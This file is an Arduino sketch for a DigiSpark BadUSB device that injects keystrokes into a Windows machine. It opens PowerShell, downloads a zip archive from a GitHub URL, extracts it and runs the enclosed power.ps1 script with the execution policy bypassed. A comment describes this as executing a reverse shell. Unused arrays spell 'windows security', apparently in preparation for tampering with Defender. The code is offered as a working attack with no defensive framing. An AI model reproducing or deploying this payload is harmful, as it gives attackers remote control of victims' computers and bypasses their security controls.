#include "DigiKeyboard.h"

// windows security 
const uint8_t key_arr_0[] PROGMEM = {0,26, 0,12, 0,17, 0,7, 0,18, 0,26, 0,22, 0,44, 0,22, 0,8, 0,6, 0,24, 0,21, 0,12, 0,23, 0,28};
// windows security
const uint8_t key_arr_1[] PROGMEM = {0,26, 0,12, 0,17, 0,7, 0,18, 0,26, 0,22, 0,44, 0,22, 0,8, 0,6, 0,24, 0,21, 0,12, 0,23, 0,28};

void duckyString(const uint8_t* keys, size_t len) {  
    for(size_t i=0; i<len; i+=2) {
        DigiKeyboard.sendKeyStroke(pgm_read_byte_near(keys + i+1), pgm_read_byte_near(keys + i));
    }
}

void setup() {
    pinMode(1, OUTPUT); // Enable LED
    digitalWrite(1, LOW); // Turn LED off
    DigiKeyboard.sendKeyStroke(0); // Tell computer no key is pressed
    DigiKeyboard.delay(1000); // DELAY 1000
    //EXECUTING THE REVERSE SHELL
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(1000);
    DigiKeyboard.print("powershell");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(2500);
    DigiKeyboard.print("(New-Object System.Net.WebClient).DownloadFile('https://github.com/asadparkar/payload/raw/main/payload.zip', 'payload.zip')");
    DigiKeyboard.delay(2000);
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(4500);
    DigiKeyboard.print("Expand-Archive -Path '.\\payload.zip' -DestinationPath '.\\'");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(2500);
    DigiKeyboard.print("cd payload");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(500);
    DigiKeyboard.print("powershell -ExecutionPolicy Bypass -File '.\\power.ps1'; exit");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER

    digitalWrite(1, HIGH); //TURN RED
}

void loop() {}
